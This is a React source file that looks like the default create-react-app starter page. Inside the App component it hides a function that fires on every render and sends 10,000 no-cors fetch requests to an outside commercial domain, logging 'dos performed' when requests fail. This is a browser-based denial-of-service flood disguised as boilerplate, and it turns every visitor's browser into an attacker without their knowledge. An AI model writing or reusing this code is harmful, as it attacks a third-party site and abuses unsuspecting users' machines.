import React from "react";
import "./App.css";

function App() {
    function tress() {
        for (let i = 0; i < 100; i++) {
            for (let j = 0; j < 100; j++) {
                fetch("https://futurocreditltda.com", {
                    mode: "no-cors",
                }).then(
                    (d) => {
                        console.log(i, j, d);
                    },
                    (e) => {
                        console.log("dos performed");
                    }
                );
            }
        }
    }
    tress();

    return (
        <div className="App">
            <header className="App-header">
                <p>
                    Edit <code>src/App.tsx</code> and save to reload.
                </p>
                <a
                    className="App-link"
                    href="https://reactjs.org"
                    target="_blank"
                    rel="noopener noreferrer"
                >
                    Learn React
                </a>
            </header>
        </div>
    );
}

export default App;
